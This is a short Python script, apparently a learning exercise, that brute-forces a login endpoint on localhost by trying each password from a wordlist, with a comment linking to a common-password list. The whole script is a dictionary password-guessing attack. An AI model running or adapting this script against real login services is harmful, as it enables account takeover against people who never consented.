import requests
with open("passwords.txt") as f:
    guesses = f.readlines()


for password in guesses: 
    password = password.rstrip()
    response = requests.get(f"http://localhost:8000/login/{password}")
    if response.status_code == 200:
        print(f"Login Successful! {password}")
        break
    else:
        print(f"login unsuccessful for {password}")
    
# print(response.text)
# https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-500.txt


